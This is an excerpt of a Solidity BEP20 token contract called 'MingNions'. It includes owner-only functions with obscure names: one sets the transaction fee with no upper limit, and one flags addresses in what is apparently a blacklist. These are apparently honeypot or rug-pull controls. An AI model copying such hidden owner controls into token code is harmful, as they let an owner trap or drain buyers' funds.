...
contract Mgnos  is IBEP20, Auth {
    ...
    string constant _name = "MingNions";
    string constant _symbol = "Mgnos";
    ...
    address private marketingFeeReceiver = 0xa83cdd12Efb035a50497F7e3822E4Ac21519Bd19;
    address private buybackFeeReceiver = 0xa83cdd12Efb035a50497F7e3822E4Ac21519Bd19;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Mgnos Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Mgnos Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Mgnos Transfer amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Mgnos TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "Mgnos receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value: amountBNBbuyback, gas: 30000}("");
        require(BuyBackSuccess, "Mgnos receiver rejected ETH transfer");
    ...
    function setDLMgnos(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDEMgnos(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignToken(address _token) public authorized {
        require(_token != address(this), "Mgnos Can't let you take all native token");
